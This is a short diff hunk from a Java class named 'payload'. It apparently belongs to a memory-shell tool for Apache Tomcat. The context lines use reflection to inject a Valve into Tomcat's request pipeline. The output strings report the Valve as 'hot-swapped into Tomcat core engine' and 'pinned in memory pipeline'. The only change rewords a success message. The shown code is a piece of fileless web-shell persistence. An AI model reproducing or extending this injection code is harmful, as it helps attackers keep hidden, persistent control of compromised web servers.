@@ -214,7 +214,7 @@ public class payload {
                         Method mAddValve = pipeline.getClass().getMethod("addValve", Class.forName("org.apache.catalina.Valve"));
                         mAddValve.invoke(pipeline, new Object[]{valveInstance});
                         
-                        return "[+] SUCCESS: Java Agent Class-level Pipeline Valve [" + valveClass.getName() + "] hot-swapped into Tomcat core engine!";
+                        return "[+] SUCCESS: Class-level Pipeline Valve [" + valveClass.getName() + "] hot-swapped into Tomcat core engine!";
                     } else {
                         return "[!] WARN: Target Valve instance already pinned in memory pipeline.";
                     }
